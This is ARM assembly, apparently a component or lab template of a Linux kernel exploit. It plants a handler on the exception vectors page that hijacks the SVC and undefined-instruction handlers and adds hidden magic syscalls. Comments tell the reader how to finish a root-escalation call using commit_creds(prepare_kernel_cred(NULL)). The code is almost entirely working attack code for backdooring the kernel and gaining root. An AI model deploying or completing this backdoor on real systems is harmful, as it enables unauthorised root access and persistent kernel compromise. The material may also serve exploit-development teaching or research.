// offset this code is placed at on the vectors page; see exploit.c
#define		OUR_OFFSET		0x0c00

// recovered from vmlinux (or /proc/kallsyms)
#define		VECTOR_UND_SYMBOL	0x11a0

svc_code:
	push	{r0}		// temporarily save r0 and check for #UND entry
	mrs	r0, CPSR
	and	r0, r0, #0x1f
	cmp	r0, #0x1b
	pop	{r0}
	bne	1f

	// yes #UND - jump to original #UND handler
	add	pc, pc, #VECTOR_UND_SYMBOL - (OUR_OFFSET + . + 8 - svc_code)

	// ok, no #UND - we have a syscall!
	// check our magic number range (0xee0000 -- 0xee0002), but do so
	// non-destructively (without clobbering a register) by doing fancy
	// register rotations...
1:
	ror	r7, r7, #16
	eor	r7, #0xee
	tst	r7, #0xff

	// if the result is "Not Equal", the syscall number is not in our
	// special range. Undo the XOR and ROR operations, and then jump
	// to the original #SVC handler; its address is stored at the word
	// directly following the vectors page (the first word of the next
	// page).
	eorne	r7, #0xee
	rorne	r7, r7, #16
	ldrne	pc, [pc, #0x1000 - (OUR_OFFSET + . + 8 - svc_code)]

	// undo the rotation, then check the special syscall number
	ror	r7, r7, #16
	cmp	r7, #0
	bne	1f

	//	#0:	[expects one parameter: location of vecpage RW mapping]
	//		a) restore original jump instruction of #UND vector
	movw	r1, #(VECTOR_UND_SYMBOL - 4 - 8) >> 2
	movt	r1, #0xea00
	str	r1, [r0, #4]
	dsb	nsh

	mcr	p15, 0, r0, c7, c11, 1		// DCCMVAU
	mcr	p15, 0, r0, c7,  c5, 0		// ICIALLU

	mov	r0, #0
	movs	pc, lr

1:	cmp	r7, #1
	bne	1f

	//	#1:
	//		yes, we're here (return success)
	mov	r0, #0
	movs	pc, lr

1:	cmp	r7, #2
	bne	1f

	//	#2:
	//		make the caller UID/GID 0
	//
	//	Add a few lines of assembly here to perform the following C call:
	//		commit_creds(prepare_kernel_cred(NULL));
	//		return 0;
	//	Make sure to save all registers you (or your called functions)
	//	might clobber! Also remember that 'bl' and 'blx' itself clobber
	//	a certain register...
	movs	pc, lr

1:	//	#OTHER:
	//		return -ENOSYS
	mov	r0, #-38
	movs	pc, lr
